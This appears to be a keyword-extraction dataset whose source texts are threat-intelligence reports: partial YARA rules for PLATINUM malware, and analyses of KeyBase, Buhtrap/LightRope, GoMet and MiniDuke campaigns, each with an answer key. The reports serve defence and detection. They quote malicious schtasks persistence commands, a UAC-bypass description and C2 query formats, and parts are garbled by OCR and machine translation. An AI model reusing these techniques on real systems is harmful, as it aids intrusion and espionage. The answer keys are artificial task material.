: Platinum description = ""Installer component"" version = ""1.0"" last_modified = ""2016-04-12"" strings: $str1 = {C6 44 24 ?? 68 C6 44 24 ?? 4D C6 44 24 ?? 53 C6 44 24 ?? 56 C6 44 24 ?? 00} $str2 = ""OUEMM/EMM"" $str3 = {85 C9 7E 08 FE 0C 10 40 3B C1 7C F8 C3}condition: $str1 and $str2 and $str3 } rule Trojan_Win32_Plaklog : Platinum description = ""Hook-based keylogger"" version = ""1.0"" last_modified = ""2016-04-12"" $str1 = ""++[%s^^unknown^^%s]++"" $str2 = ""vtfs43/emm"" $str3 = {33 C9 39 4C 24 08 7E 10 8B 44 24 04 03 C1 80 00 08 41 3B 4C 24 08 7C F0 $str1 and $str2 and $str3 } rule Trojan_Win32_Plapiio : Platinum description = ""JPin backdoor"" version = ""1.0"" last_modified = ""2016-04-12"" $str3 = {C6 45 ?? 68 C6 45 ?? 4D C6 45 ?? 53 C6 45 ?? 56 C6 45 ?? 6D C6 45 ?? 6D} $str1 and $str2 and $str3 } rule Trojan_Win32_Plabit : Platinum author = ""Microsoft""Installer component"" version = ""1.0""last_modified = ""2016-04-12"" strings: $str1 = {4b D3 91 49 A1 80 91 42 83 B6 33 28 36 6B 90 97} $str2 = ""GetInstanceW"" $str3 = {8B D0 83 E2 1F 8A 14 0A 30 14 30 40 3B 44 24 04 72 EE} $str1 and $str2 and $str3 } rule Trojan_Win32_Placisc2 : Platinum description = ""Dipsind variant"" version = ""1.0"" last_modified = ""2016-04-12"" strings: $str1 = {76 16 8B D0 83 E2 07 8A 4C 14 24 8A 14 18 32 D1 88 14 18 40 3B C7 72 EA $str3 = ""%d) Command:%s"" $str4 = {0D 0A 2D 2D 2D 2D 2D 09 2D 2D 2D 2D 2D 2D 0D 0A} $str1 and $str2 and $str3 and $str4 } rule Trojan_Win32_Placisc3 : Platinum description = ""Dipsind variant"" version = ""1.0"" last_modified = ""2016-04-12"" strings: $str1 = {BA 6E 00 00 00 66 89 95 ?? ?? FF FF B8 73 00 00 00 66 89 85 ?? ?? FF FF B9 64 00 00 00 66 89 8D ?? ?? FF FF BA 65 00 00 00 66 89 95 ?? ?? FF FF B8 6C 00 00 $str3 = {8B 44 24 ?? 8A 04 01 41 32 C2 3B CF 7C F2 88 03} $str1 and $str2 and $str3} rule Trojan_Win32_Placisc4 : Platinum description = ""Installer for Dipsind variant"" version = ""1.0"" last_modified = ""2016-04-12"" strings: $str1 = {8D 71 01 8B C6 99 BB 0A 00 00 00 F7 FB 0F BE D2 0F BE 04 39 2B C2 88 04 39 84 C0 74 0A} $str2 = {6A 04 68 00 20 00 00 68 00 00 40 00 6A 00 FF D5} $str3 = {C6 44 24 ?? 64 C6 44 24 ?? 6F C6 44 24 ?? 67 C6 44 24 ?? 32 C6 44 24 ?? $str1 and $str2 and $str3 } rule Trojan_Win32_Plakpers : Platinum description = ""Injector / loader component"" version = ""1.0"" last_modified = ""2016-04-12"" $str2 = ""[%.3u] %s %s %s [%s:"" wide $str3 = ""%s\\{%s}\\%s"" wide $str1 and $str2 and $str3 } rule Trojan_Win32_Plainst2 : Platinum description = ""Zc tool"" version = ""1.0""last_modified = ""2016-04-12"" strings: $str1 = ""Connected [%s:%d] "" $str2 = ""reuse possible: %c"" $str3 = ""] => %d%%\x0a"" $str1 and $str2 and $str3 } rule Trojan_Win32_Plakpeer : Platinum description = ""Zc tool v2"" version = ""1.0"" last_modified = ""2016-04-12"" strings: $str1 = ""@@E0020(%d)"" wide $str2 = /exit.{0,3}@exit.{0,3}new.{0,3}query.{0,3}rcz.{0,3}scz/ wide $str1 and $str2 and $str3 and $str4 } ","{'phrases': ['PLATINUM', 'files', 'targets', 'South and Southeast Asia', 'entities', 'spear', 'email', 'users', 'exploits', 'zero-day', 'vulnerabilities', 'Dipsind', 'JPIN', 'backdoors', 'command', 'control', 'compromised infrastructure', 'CA', 'access', 'years', 'tools', 'DEP', 'reconnaissance', 'analysis', 'details', 'domains', 'dynamic DNS', '10', 'detection', 'YARA', 'rule'], 'target': 'PLATINUM; files; targets; South and Southeast Asia; entities; spear; email; users; exploits; zero-day; vulnerabilities; Dipsind; JPIN; backdoors; command; control; compromised infrastructure; CA; access; years; tools; DEP; reconnaissance; analysis; details; domains; dynamic DNS; 10; detection; YARA; rule.'}"
attackers; spear-phishing emails; Excel; users; the email; the victim; the macro; the malware; the C2 server; commands; a command; a lateral movement; the system; the attackers; information; the file; files; commands; a malware; data; the system.,"['1. On January 25, 2017, the attackers sent spear-phishing emails purporting to be from the company Hidrofersa to targets at Mazagon Dock Shipbuilders Limited (MDL). 2. The emails contained Excel attachments with malicious macros. 3. If the victim enabled macros, the Excel file would execute a macro to download and install the KeyBase malware. 4. The macro used obfuscation and junk code to avoid detection and analysis. 5. The macro decoded a PowerShell script that downloaded the KeyBase executable file from a compromised university website. 6. The PowerShell script executed a UAC bypass technique to run the malware with high privileges. 7. The malware established persistence by copying itself to the All Users profile and adding a registry key to ensure it runs on startup. 8. The malware tracked user activity like keystrokes and screenshots but did not immediately connect to its command and control server. 9. After a long sleep time, the malware connected to the C2 server tripleshop[.]id hosted on a server in Indonesia. 10. The malware sent all the tracked user activity and screenshots to the C2 server. 11. Analysis suggests the attack originated from a Pakistan-based company, indicating a possible state-sponsored espionage campaign. ']","Extract the keywords: 2/28/2017Cyber Attack Targeting Indian Navy's Submarine and Warship Manufacturer - CysinfoCYBER ATTACK TARGETING INDIAN NAVY’S SUBMARINE AND WARSHIP MANUFACTURER3 WEEKS AGO • ARTICLES •21In my previous blog posts I described attack campaigns targeting Indian government organizations, and Indian Embassies andMinistry of External a airs. In this blog post I describe a new attack campaign where cyber espionage group targeted the users ofMazagon Dock Shipbuilders Limited (also called as ship builder to the nation). Mazagon Dock Shipbuilders Limited (MDL) is aPublic Sector Undertaking of Government of India (Ministry of Defence) and it specializes in manufacturing warships and submarinesfor the Indian Navy.In order to infect the users associated with Mazagon Dock Shipbuilders Limited (MDL), the attackers distributed spear-phishingemails containing malicious excel  le which when opened drops a malware capable of spying on infected systems. The emailpurported to have been sent from legitimate email ids. The attackers spoofed the email id associated with a Spain based equipmentmanufacturing company Hidrofersa which specializes in designing, manufacturing naval, industrial and mining machinery.Overview of the Malicious EmailsOn 26th January, 2017 Indian Navy displayed its state-of-the-art stealth guided missile destroyer INS Chennai and the indigenously-made Kalvari class Scorpene submarines at the Republic Day parade showcasing India’s military strength and achievements. INSChennai and Kalvari class submarines were manufactured by Mazagon Dock Shipbuilders Limited (MDL).On 25th January (day before the Republic day) attackers spoofed an email id associated with Hidrofersa a Spain based companywhich specializes in designing, manufacturing naval, industrial and mining machinery and the email was sent to the users ofMazagon Dock Shipbuilders Limited (MDL). The email attachment contained two malicious excel  les (both excel  les turned out tobe same but used di erent names). The email was made to look like it was sent by a General service manager of Hidrofersaenquiring about the product delivery schedule.Below screen shot shows the recipients associated with Mazagon Dock Shipbuilders Limited (MDL), this information was determinedfrom the Email header.Mazagon Dock Shipbuilders Limited (MDL) is listed as one of clients of Hidrofersa (mentioned in Hidrofersa website) and as per theirwebsite Hidrofersa has shipped equipments to Mazagon Dock Shipbuilders Limited (MDL) in the past as shown in the below screenshots. This is probably the reason attackers spoofed the email id of Hidrofersa as it is less likely to trigger any suspicion and there isurl Attack Targeting Indian Navy's Submarine and Warship Manufacturer - Cysinfohigh chance of recipients opening the attachment as it is coming from a trusted equipment manufacturer (Hidrofersa) . It looks like attackers carefully researched (or they already knew about) the trust relationship between these two companies.From the email it looks like the goal of the attackers was to infect, take control of the systems of users associated with MazagonDock Shipbuilders Limited (MDL) and to steal sensitive information (like Product design documents, blueprints, manufacturingprocesses etc) related to warships and submarines.Analysis of Malicious Excel FileWhen the recipient of the email opens the attached excel  le it prompts the user to enable macro content and the excel alsocontains instruction on how to enable the macros.Once the the macro content is enabled, it calls an auto execute function Workbook_Open() which in turn downloads the malwaresample and executes on the system. The malicious macro code was reverse engineered to understand its capabilities. The macrocode was heavily obfuscated (used obscure variable/function names to make analysis harder) as shown below.url Attack Targeting Indian Navy's Submarine and Warship Manufacturer - CysinfoThe macro also contained lot of junk code, unnecessary comments and variable assignments as shown below. The attackers probably compromised the university website to host the malware. The technique of hosting malicious code in a university site (legitimate site) has advantages and it is unlikely to trigger any suspicion in security monitoring and also can bypass reputation based devices. The PowerShell script (shown below) drops the downloaded executable in the %TEMP% directory as “doc6.exe“. It then adds a registry entry for the dropped executable and invokes eventvwr.exe, this is an interesting registry hijack technique which allows the doc6.exe to be executed by eventvwr.exe with high integrity level and also this technique silently bypasses the UAC (user account control). This technique of UAC bypass is mentioned in the blog “Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking. Normally when eventvwr.exe process (which is running as high integrity process) is invoked, it starts mmc.exe which opens eventvwr.msc causing the Event Viewer to be displayed. To start mmc.exe, eventvwr.exe searches this registry key. The dropped Òle (doc6.exe) was determined as KeyBase malware. This malware can steal and send sensitive information to the attackers like keystrokes, opened applications, web browsing history, usernames/passwords, upload Desktop screen shots etc. The feature of uploading the Desktop screen shot is notable because if the infected user opens a design or design document related to submarines or warships the screen shot of that can be sent to the attacker. The attackers also hosted multiple samples of KeyBase malware in the compromised university website. Below screen shot shows hashes of 25 samples hosted on the university site. Analysis of the Dropped Executable (doc6.exe) The dropped Òle was analyzed in an isolated environment (without actually allowing it to connect to the c2 server). This section contains the behavioral analysis of the dropped executable. Once the dropped Òle (doc6.exe) is executed the malware copies itself into %AllUsersProÒle% directory as “Important.exe”, In addition to that it also drops two Òles “Mails.txt” and “Browsers.txt” into the same directory as shown below. The malware then creates a registry value for the the dropped Òle (Important.exe), this ensures that malware is executed every time the system restarts. The malware after execution keeps track of the user activity (like applications opened, Òles opened etc) but does not immediately generate any network traÕc, this is to make sure that no network activity is generated during automated/sandbox analysis. After sleeping for a long time malware makes an http connection to the C2 server (command & control server) and sends the tracked user activity to the attacker. The below screen shot shows the communication to the C2 server on port 80. Once malware makes an http connection after sleeping for a long time, it sends the system information and the tracked activity to the C2 server as http parameters. Below screen shot shows the network communication pattern where the hostname and the machine time is sent to C2 server. Below screen shot shows a network communication pattern where the opened window title was sent to the C2 server, this pattern below indicates that “test.txt” Òle was opened with notepad on the infected system. Below screen shot shows a network communication pattern indicating a document named “secret.docx” was opened with Microsoft Word. Threat Intelligence Even though attackers tried to make it look like the spear phishing email was sent by an email id associated with Hidrofersa but inspecting the email headers revealed some interesting information. Based on the information mentioned above, It looks like the spoofed email was sent by a user associated with a Pakistan based company Combined Freight (PVT) Limited. Indicators Of Compromise In this case the cyber espionage group targeted Mazagon Dock Shipbuilders Limited (MDL) but it is possible that other defense equipment manufacturers could also be targeted as part of this attack campaign. The indicators associated with this attack are provided so that the organizations (Government, Public, Private organizations, Defense and Defense equipment manufacturers) can use these indicators to detect, remediate and investigate this attack campaign. Below are the indicators.","{'phrases': ['January', '25', '2017', 'the attackers', 'port', 'Hidrofersa', 'Mazagon Dock Shipbuilders Limited', 'MDL', 'the email', 'Excel', 'macros', 'KeyBase malware', 'The macro', 'junk code', 'analysis', 'Compromise', 'The PowerShell script', 'UAC bypass', 'the malware', 'users', 'a registry', 'keystrokes', 'screenshots', 'control', 'the c2 server', 'the tracked user activity', 'Pakistan'], 'target': 'January; 25; 2017; the attackers; port; Hidrofersa; Mazagon Dock Shipbuilders Limited; MDL; the email; Excel; macros; KeyBase malware; The macro; junk code; analysis; Compromise; The PowerShell script; UAC bypass; the malware; users; a registry; keystrokes; screenshots; control; the c2 server; the tracked user activity; Pakistan.'}"
the attackers; the document; macros; the shellcode; SourSnack; the lightRope; the shellcode; the LightRope payload; The DNS; the data; commands; the dnscat program; the computer; LibManager; functionality; remote access; data; commands; the C2 server; commands; files; the LightRope program; LiteManager; data; the computer.,"['1. The attackers distribute a malicious Excel macro document via email. 2. The macro executes SourSnack malware which gathers system info and contacts a C2 server. 3. SourSnack decrypts and executes the LightRope malware payload. 4. LightRope establishes persistence and installs dnscat for DNS tunneling. 5. The attackers use dnscat and other tools like LiteManager for remote access and data exfiltration. 6. Additional payloads like NTDSDumpEx are used for Active Directory data theft. 7. Ngrok is leveraged for tunneling and accessing internal systems. 8. The malware is signed with valid digital certificates for disguise. 9. Network traffic is tunneled through the DNS protocol to avoid detection. 10. Recommended defenses include filtering ports, monitoring DNS, ensuring centralized AV management, and enabling remote access for detection and response. ']","Extract the keywords: cert-gov-ua.translate.goog /article/37246 CERT-UAGeneral informationAt the beginning of the fierce 2022, the CERT-UA Ukrainian Supervisory Computer Response Team, as one of the coordinating subjects, took away information about the detection of potentially scalable programs on the computers of spivrobitniks.Based on the results of the analysis, it was established that the data on objects should be checked for the signs of shkidlivyh programs, classified as LightRope and LiteManager. Further correlation of indicators of compromise, as well as tactics, techniques and procedures, allowed the activity to be associated with the activities of the UAC-0008 group (Buhtrap). In view of the fact that the files of shkіdlivih programs were signed with an electronic signature, the attack was specifically looked at before 01/16/2022.Dovidkovo:The Buhtrap group in the period from 2014 to 2016 recorded a low number of attacks , worse, on the financial organizations of Russia. At the same time, in 2016, in 2016, incl., after the publication of the victorious code of victorious programs, for unknown reasons, the group began to carry out attacks exclusively against specific state authorities and enterprises of Ukraine, victorious, in the middle, programmatically.Depending on the nature of the injection on the information and telecommunication systems of the attacked organizations, it is obvious that the group is fixed in the corporate measure of sacrifice and the improvement of the process of taking away information, as it is processed in special systems of organizations.For a preliminary demonstration of the method of penetration of that victorious group of instruments, it is important to visit the following incident, which may be the month of 2021.So, apparently, for the help of electronic mail, the evil-doers created a rozposyudzhennya sending to the shkidly document “2021-07-30-08-55-07.xlsm”. Once the document is opened and the macro activated on the victim's computer, the file “output.exe” will be created, which is classified as the SourSnack program. Remaining with the basic information about the computer, generating a DNS-query to the control server, having removed the key from the output key, decoding the configuration file that was created at the resource looking at the configuration file and further decrypting the payload, which appears before the LightRope guesses (aleNadalі, LightRope zdіysny dekoduvannya vbudovannogo resource, saving the file on the computer and the creation of a scheduled task to ensure the persistence of the launch of the rest. As a result, the dnscat program will be installed on the victim's computer to give the attackers the ability to remotely steal the add-on, tunneling information flows behind the DNS protocol.1/4Respectfully, that file-droppers, like vikoristovuyutsya group, as a rule, signed with a digital digital signature.Not a crossover of shkіdlivih programs that are victorious in a group:dnscat - software security, spread out over various movable programs C. Designed to create an encrypted channel for managing between a client and a server behind an additional DNS protocol. Supported by *nix and Windows operating systems. Transferred functionality for remote viewing of commands on the client through the terminal.LiteManager is a smartly cost-free program with a lock-out code for remote administration and computer management. Broken down by the Russian company LiteManagerTeam. The project is an official continuation of the closed Remote Office Manager project. The client part is available for operating systems: Windows, Android, Mac OS, iOS, iPhone, iPad.SourSnack is a smart program, divided into different versions of C. It takes care of retrieving basic information about the computer (GetComputerName, GetUserName, GetAdaptersInfo). There is a connection with the management server for decrypting the encryption key for decrypting the PE file, which is located at the encrypted resource, and saving it on the computer in the %APPDATA% directory and further launch. For communication with the control server, the DNS protocol (TXT records) is used; Information about EOM is encoded for help hex. To decrypt the resource, XOR is required; for decryption of a PE file, an algorithm based on mathematical operations (XOR / DIV / MUL) is used, which implements the transformation of blocks, the majority of which is assigned the encryption key.LightRope is a tricky program, divided into different versions of C. It takes the role of a dropper, allowing ZLIB decompression (may not be broken) and XOR decoding of the payload of the resource, as well as the creation of a scheduled task. With the method of unification of the created files, the elements of their resources can be filled with sufficient tribute.NTDSDumpEx is a publicly available security software, recognized for extracting information from the Active Directory database %SYSTEMROOT%\NTDS.dit, and itself: data about domain cloud records, group memberships and password hashes.RDPWrapper is a publicly available security software designed to make it possible to run multiple parallel RDP sessions on a computer.Ngrok is a publicly available software, recognized for the publication of any service (meadow port) on the widget.forum-pokemon[.]com ns.ns2-dns[.]com ns.ns3-dns[.]com ns3-dns[.]com ns2-dns[.]com cs1.wpc-v0cdn[.]org wpc-v0cdn[.]org ipv6-wpnc[.]net alt-2cdn[.]net nais-gov[.]org nais-gov[.]com 91[.]240.86.200 89[.]108.101.61 45[.]76.85.232 185[.]162.9.218 95[.]179.135.36 91[.]240.86.200:5651Mikael LLC (administrator@mikael-company[.]ru) George Alan Developments Incorporated C:\windows\system32\wbem\wmic.exe process whereC:\windows\system32\wbem\wmic.exe process whereHosts: ExecutablePath='C:\\ProgramData\\lsass.exe' delete ExecutablePath='C:\\ProgramData\\svchost.exe' delete Security Update"" /tr ""C:\ProgramData\lsass.exe"" /en SYSTEM%PROGRAMDATA%\lsass.exe %PROGRAMDATA%\svchost.exe %PROGRAMDATA%\config.xml %PUBLIC%\output.exe %APPDATA%\dnsoption.exe %APPDATA%\Microsoft\Windows\CDSSyncReporting.exeC:\windows\system32\schtasks.exe /delete /tn ""Network SecurityC:\windows\system32\schtasks.exe /create /sc onstart /tn ""NetworkAdditional information3/4· It is recommended to change the so-called “attack surface” (attack surface), including for filtering mesh ports for external information flows.· With the method of revealing the facts of tunneling information flows behind the additional DNS protocol, perform rechecking and further monitoring of the log files for the presence of anomalous DNS backlogs.· Implement the possibility of centralized management of anti-virus protection on all non-powered computers; transfer the ability to live on computers (launching Yara-rules, accessing shkіdlіvіh files, searching for indicators then), in the first line, in remote access mode.Graphic imagesRice. 1 Download free download4/4 ","{'phrases': ['the attackers', 'the macro', 'SourSnack', 'LightRope', 'persistence', 'dnscat', 'tunneling', 'LiteManager', 'remote access', 'data', 'NTDSDumpEx', 'Active Directory', 'Ngrok', 'the DNS protocol', 'detection', '10', 'response'], 'target': 'the attackers; the macro; SourSnack; LightRope; persistence; dnscat; tunneling; LiteManager; remote access; data; NTDSDumpEx; Active Directory; Ngrok; the DNS protocol; detection; 10; response.'}"
the attackers; an appliance; CVE-2020-5902; the malware; a remote code execution vulnerability; Sophos firewall; The GoMet backdoor; payloads; the agent; commands; the C2; 10; the attacker; changes; the backdoor; logic; the malware; communication; the attackers; a fake Windows update; scheduled tasks; the Windows update; 11; Ukrainian.,"[""1. The threat actor gains initial access to the Ukrainian software development company's systems through unspecified means. 2. The attacker drops the GoMet backdoor onto compromised machines. 3. GoMet connects to the hardcoded command and control server at 111.90.139[.]122. 4. The attacker sends commands through the C2 to control the infected machines. 5. GoMet executes actions on the victims like running commands, uploading/downloading files, opening remote shells, etc. 6. GoMet uses techniques like fake Windows updates and modified autorun values for persistence. 7. The attacker moves laterally within the network and compromises additional systems. 8. Sensitive data is exfiltrated from the network back to the threat actor. ""]","Extract the keywords: blog.talosintelligence.com /2022/07/attackers-target-ukraine-using-gomet.html Attackers target Ukraine using GoMet backdoorExecutive summarySince the Russian invasion of Ukraine began, Ukrainians have been under a nearly constant barrage of cyber attacks. Working jointly with Ukrainian organizations, Cisco Talos has discovered a fairly uncommon piece of malware targeting Ukraine — this time aimed at a large software development company whose software is used in various state organizations within Ukraine. We believe that this campaign is likely sourced by Russian state-sponsored actors or those acting in their interests. As this firm is involved in software development, we cannot ignore the possibility that the perpetrating threat actor's intent was to gain access to source a supply chain-style attack, though at this time we do not have any evidence that they were successful. Cisco Talos confirmed that the malware is a slightly modified version of the open-source backdoor named ""GoMet."" The malware was first observed on March 28, 2022. GoMet backdoorThe story of this backdoor is rather curious — there are two documented cases of its usage by sophisticated threat actors. First, in 2020, attackers were deploying this malware after the successful exploitation of CVE-2020-5902, a vulnerability in F5 BIG-IP so severe that USCYBERCOM posted a tweet urging all users to patch the application. The second is more recent and involved the successful exploitation of CVE-2022-1040, a remote code execution vulnerability in Sophos Firewall.1/7Both cases are very similar. They both start with the exploitation of a public vulnerability on appliances where the malicious actors then dropped GoMet as a backdoor. As of publishing time, Cisco Talos has no reason to believe these cases are related to the usage of this backdoor in Ukraine.The original GoMet author posted the code on GitHub on March 31, 2019 and had commits until April 2, 2019. The commits didn't add any features but did fix some code convention aesthetics. The backdoor itself is a rather simple piece of software written in the Go programming language. It contains nearly all the usual functions an attacker might want in a remotely controlled agent. Agents can be deployed on a variety of operating systems (OS) or architectures (amd64, arm, etc.). GoMet supports job scheduling (via Cron or task scheduler depending on the OS), single command execution, file download, file upload or opening a shell. An additional notable feature of GoMet lies in its ability to daisy chain — whereby the attackers gain access to a network or machine and then use that same information to gain access to multiple networks and computers — connections from one implanted host to another. Such a feature could allow for communication out to the internet from otherwise completely ""isolated"" hosts.This version was changed by malicious actors, in the original code, the cronjob is configured to be executed once every hour on the hour. In our samples, the cronjob is configured to run every two seconds. This change makes the sample slightly more noisy since it executes every two seconds, but also prevents an hour-long sleep if the connection fails which would allow for more aggressive reconnection to the C2.The objective of the cron job defined in the main part of the malware is to check if it's connected to the C2, if not it will start the agent component again and connect to the C2. The picture below shows the execution flow of the C2 setup routine Agent.Start.2/7This flow reveals another change to the GitHub versions. If the C2 is unreachable, the sample will sleep for a random amount of time between five and 10 minutes. GO's sleep implementation uses nanoseconds. The Pseudo Code would look like the following: time_Sleep(1000000000 * (rnd_val + 300)).The 'WaitGroup_Add' call in the disassembly screenshot can also be confusing. The trick is, the Go compiler is changing the source code WaitGroup.Done() to WaitGroup.Add(-1).After the Agent.start routine is done, the next cron job triggered the execution of the serve() routine and different configuration.If we look closely at the functions, they are not 100% equal, but we can see that the changes are mainly strings and similar victim or compiler-dependent data, along with researcher comments. Below is the Main.Main function as an example.5/7The malicious activity we detected included a fake Windows update scheduled tasks created by the GoMet dropper. Additionally, the malware used a somewhat novel approach to persistence. It enumerated the autorun values and, instead of creating a new one, replaced one of the existing goodware autorun executables with the malware. This potentially could avoid detection or hinder forensic analysis.In one of the cases, about 60 seconds before the schtask query is executed, a blank CMD process is opened and then subsequently executes systeminfo and schtask queries rather than these queries being chain opened by svchost or services or another process. This execution looks like:C:\WINDOWS\system32\cmd.exe 7)systeminfoschtasks /query /tn microsoft\windows\windowsupdate\scheduledschtasks /query /tn microsoft\windows\windowsupdate\scheduled /v InfrastructureBoth samples have the command and control (C2) IP address hardcoded, which is 111.90.139[.]122. Communication occurs via HTTPS on the default port.6/7The certificate on this server was issued on April 4, 2021 as a self-signed certificate, with the preparation began as early as April 2021. At the moment, there are no known domains associated with this IP address and the last time there was a domain associated with it was on Jan. 23, 2021, which is outside the known attack time frame. ConclusionAs the war in Ukraine rages on with little resolution in sight, we are reminded that attackers will try just about anything to gain additional leverage over their Ukrainian adversaries. Cisco Talos expects to see the continued deployment of a range of cyber weapons targeting the Ukrainian government and its counterparts. We remain vigilant and are committed to helping Ukraine defend its networks against such cyber attacks and working closely with our strategic allies in the region to gather and provide actionable threat intelligence.In this instance, we saw a software company targeted with a backdoor designed for additional persistent access. We also observed the threat actor take active steps to prevent detection of their tooling by obfuscating samples and utilizing novel persistence techniques. This access could be leveraged in a variety of ways, including deeper access or launching additional attacks, including the potential for software supply chain compromise. It's a reminder that although the cyber activities haven't necessarily risen to the level many have expected, Ukraine is still facing a well-funded, determined adversary that can inflict damage in a variety of ways — this is just the latest example of those attempts.We assess with moderate to high confidence that these actions are being conducted by Russian state- sponsored actors or those acting in their interests.Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. Indicators of Compromise ","{'phrases': ['the threat actor', 'access', 'Ukrainian', 'software development', 'The attacker', 'GoMet', 'Compromise', 'machine', 'control', '111.90.139[.]122', 'the C2', 'actions', 'techniques', 'Windows', 'date', 'autorun values', 'persistence'], 'target': 'the threat actor; access; Ukrainian; software development; The attacker; GoMet; Compromise; machine; control; 111.90.139[.]122; the C2; actions; techniques; Windows; date; autorun values; persistence.'}"
the malware; HTTP; HTTP; Google; the user; the URL; GET; the malware; the address; server; information; detection; keylogging; logging; C2; communication; detection.,"[""1. The attacker sends a spearphishing email with a malicious PDF exploiting CVE-2013-0640. 2. The victim opens the PDF, triggering the exploit to install the first stage MiniDuke backdoor. 3. The backdoor sets persistence via a startup LNK file and contacts the C2 over Twitter. 4. The C2 tweets an encrypted command triggering the malware to download the second stage from a compromised site. 5. The second stage backdoor can download more modules from the C2 servers. 6. The backdoors fingerprint the infected system and exfiltrate this data to the C2. 7. Additional payloads are delivered via encrypted GIFs from the command servers. 8. The final payloads allow the attacker to control the system and extract documents. 9. C2 logs reveal victims' details like location and system info. ""]","Extract the keywords: Miniduke: Indicatorsv1.00 (Feb 27, 2013)Technical ReportbyLaboratory of Cryptography and System Security (CrySyS Lab)url University of Technology and EconomicsDepartment of Networked Systems and Servicesurl Malware Intelligence Team. Based on joint work with Kaspersky Labs GREATTeamDocument history27/02/2013 Initial releaseTable of contents1.Introduction 42. Known malware samples 53. Detection of the running malware 114. C&C communication 13 Detection of C&C communications 15 Initial C&C communication 15 Other indicators of C&C communication: Google and Twitter queries 184.1. 4.2. /srch/index.php/forumengine/index.php/events/index.php Not shown: 65524 closed ports PORT STATE SERVICE 22/tcp open ssh 111/tcp open rpcbind 920/tcp open unknown 1437/tcp open tabula 46436/tcp open unknownFigure 6 – Stage 3 C&C server information4.1. Detection of C&C communicationsBasic detection can be based on 3 queries that are initiated by the victim computers withinseconds.www.google.com – port TCP/80 - HTTP twitter.com –port TCP/443 - SSL www.geoiptool.com –port TCP/80 - HTTPFigure 7 – Initial web page – and possibly DNS queries issued by the malwareKnown search strings in Google search (see below) can also be used to detect the malware.Unfortunately, these strings are most likely unique to each C&C server or victim, thusunknown samples might use other strings, but possibly with the same length.lUFEfiHKljfLKWPR HkyeiIDKiroLaKYr lUFEfiHKDroLaKYrFigure 8 – Google search strings used by the malwareThe malware also sends a query to the geoiptool. An example is shown below:GET / HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US; Trident/5.0) Host: www.geoiptool.comFigure 9 – Geoip lookup query sample – Agent string might be different for each query!4.2. Initial C&C communicationInitial communications with the stage 2/3 delivery C&C servers (such as arabooks.ch) can beused to develop detection signatures as follows:The malware retrieves the URL using a Twitter query as described earlier. Then, we canobserve the first query from the victim towards the stage 2/3 delivery C&C server. This querycontains pure HTTP traffic on port 80 to the server following the template below.GET /original/path/shortname/index.php?e=aaaaaaaaawhere:• shortname can be a number of strings, generally human readable (e.g. lib, engine,forum, forumengine etc.)• ""e="" is not constant, can be anything, but generally 1-2 letters long • aaaaaaaaa stands for some Base64-like text (see details below) •the servers used are assumed to be legitimate sites, just hacked by the attackers.Based on this format, we can detect a valid query as follows:• The name of the 1st GET parameter should be discarded • • we saw only one GET parameter, queries with multiple parameters are likely notthis means ""e="" is not importantusedFor detection, the Base64-like string ""aaa…"" should be first modified as follows:• ""-"" should be replaced by ""+"" • ""_"" should be replaced by ""/""This results in correct Base64 encoding, which can be decoded with library functions such asbase64_decode. After decoding, a string of data, partially binary will be available. Parts areseparated by the delimiter character ""|"". The format and a numerical example are below:<binary data ( ~100 bytes)>|<numerical ID ( ~10 digits)>|<version number>e.g.,<binary data>|5551115551|1.13As the binary data itself may contain the ”|” character, parsing should start from the end(i.e., the numerical ID starts from the second “|” character from the end). In additional, theID length may vary (not fully confirmed), but it seems to be around 10 digits. Finally, theversion number always follows the pattern <1digit><dot><two digits>, e.g., 1.1X 3.1X.The correct decoding of the HTTP query information should be enough to quickly developpossible IDS-based detections. As we have seen, detection is complicated, but notimpossible. The following is the summary of potential detection steps:• Check if there is only one GET parameter • • convert the Base64-like GET parameter string into real Base64 encoding, and check if(check if path is not empty and contains index.php)(possible, but not confirmed)it decodes correctly• check if the decoded string has at least two delimieter character ""|"" in it • check if after the last but first “|” character, there are digits only • check if the version part of the string follows the format “1.11” or similarThe header sent is fairly standard, but we include one example nonetheless:0x00d0: 2e31 0d0a 4163 6365 7074 3a20 2a2f 2a0d .1 Accept:.*/*. 0x00e0: 0a41 6363 6570 742d 456e 636f 6469 6e67 .Accept-Encoding 0x00f0: 3a20 677a 6970 2c20 6465 666c 6174 650d :.gzip,.deflate. 0x0100: 0a55 7365 722d 4167 656e 743a 204d 6f7a .User-Agent:.Moz 0x0110: 696c 6c61 2f34 2e30 2028 636f 6d70 6174 illa/4.0.(compat 0x0120: 6962 6c65 3b20 4d53 4945 2037 2e30 3b20 ible;.MSIE.7.0;. 0x0130: 5769 6e64 6f77 7320 4e54 2035 2e31 3b20 Windows.NT.5.1;. 0x0140: 5472 6964 656e 742f 342e 303b 2049 6e66 Trident/4.0;.Inf 0x0150: 6f50 6174 682e 3129 0d0a 486f 7374 3a20 oPath.1) Host:. 0x0160: XXXX XXXX XXXX XXXX XXXX XX0d 0a43 6f6e XXXXXXXXXXX Con 0x0170: 6e65 6374 696f 6e3a 204b 6565 702d 416c nection:.Keep-Al 0x0180: 6976 650d 0a0d 0a ive Figure 10 – Other HTTP header values in a C&C queryThe used Agent strings vary significantly across queries, therefore they cannot be really usedfor detection:Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1) Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1;+InfoPath.2) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+.NET+CLR+1.1.4322;+ .NET+CLR+2.0.50727;+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+InfoPath.2) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+.NET+CLR+2.0.50727; +.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+InfoPath.2) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+.NET4.0C;+.NET+CLR+ 1.1.4322;+.NET+CLR+2.0.50727;+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+.NET4.0E; +InfoPath.3) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+GTB7.4;+InfoPath.1; 